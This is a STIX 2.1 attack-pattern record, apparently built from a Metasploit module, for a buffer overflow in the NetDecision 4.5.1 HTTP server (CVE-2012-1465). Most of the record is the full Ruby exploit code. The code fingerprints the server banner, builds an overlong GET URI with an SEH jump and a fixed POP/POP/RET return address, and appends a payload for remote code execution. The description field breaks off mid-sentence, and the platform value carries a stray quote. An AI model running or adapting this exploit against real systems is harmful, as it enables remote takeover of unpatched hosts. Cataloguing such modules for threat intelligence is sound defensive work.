{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--77fdb481-733a-4def-975e-b8c6444327ce",
    "created": "2024-08-14T16:55:34.524721Z",
    "modified": "2024-08-14T16:55:34.524725Z",
    "name": "\"NetDecision 4.5.1 HTTP Server Buffer Overflow\"",
    "description": " This module exploits a vulnerability found in NetDecision's HTTP service (located in C:\\Program Files\\NetDecision\\Bin\\HttpSvr.exe).  By supplying a",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/netdecision_http_bof.rb",
            "external_id": "netdecision_http_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-1465"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20121024124508/http://secunia.com/advisories/48168/"
        },
        {
            "source_name": "reference",
            "url": "http://secpod.org/advisories/SecPod_Netmechanica_NetDecision_HTTP_Server_DoS_Vuln.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"NetDecision 4.5.1 HTTP Server Buffer Overflow\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in NetDecision's HTTP service\n        (located in C:\\Program Files\\NetDecision\\Bin\\HttpSvr.exe).  By supplying a\n        long string of data to the URL, an overflow may occur if the data gets handled\n        by HTTP Server's active window.  In other words, in order to gain remote code\n        execution, the victim is probably looking at HttpSvr's window.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Prabhu S Angadi',  #Discovery, DoS PoC\n          'sinn3r'            #Metasploit\n        ],\n      'References'     =>\n        [\n          ['CVE', '2012-1465'],\n          ['OSVDB', '79651'],\n          ['URL', 'http://web.archive.org/web/20121024124508/http://secunia.com/advisories/48168/'],\n          ['URL', 'http://secpod.org/advisories/SecPod_Netmechanica_NetDecision_HTTP_Server_DoS_Vuln.txt']\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\\x09\\x0a\\x0d\\x20\\x25\\x26\\x27\\x3f\",\n          'StackAdjustment' => -3500,\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => \"seh\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [\n            'NetDecision 4.5.1 on XP SP3',\n            {\n              # POP/POP/RET - OLEACC.dll\n              'Ret'    => 0x74C869E2,\n              'Offset' => 1620\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-02-24',\n      'DefaultTarget'  => 0))\n  end\n\n  def check\n    res = send_request_cgi({'uri'=>'/'})\n    banner = res.headers['Server']\n    if banner =~ /NetDecision\\-HTTP\\-Server\\/1\\.0/\n      return Exploit::CheckCode::Appears\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    buf = \"/\"\n    buf << rand_text_alpha(675, payload_badchars)\n    buf << pattern_create(5) #Avoid TerminateProcess()\n    buf << rand_text_alpha(target['Offset']-buf.length, payload_badchars)\n    buf << \"\\xeb\\x06\" + rand_text_alpha(2, payload_badchars)\n    buf << [target.ret].pack('V*')\n    buf << payload.encoded\n    buf << rand_text_alpha(8000-buf.length, payload_badchars)\n\n    print_status(\"#{rhost}:#{rport} - Sending #{self.name}...\")\n\n    send_request_raw({\n      'method' => 'GET',\n      'uri'    => buf\n    })\n\n    handler\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2012-02-24",
    "x_mitre_platforms": [
        "win'"
    ]
}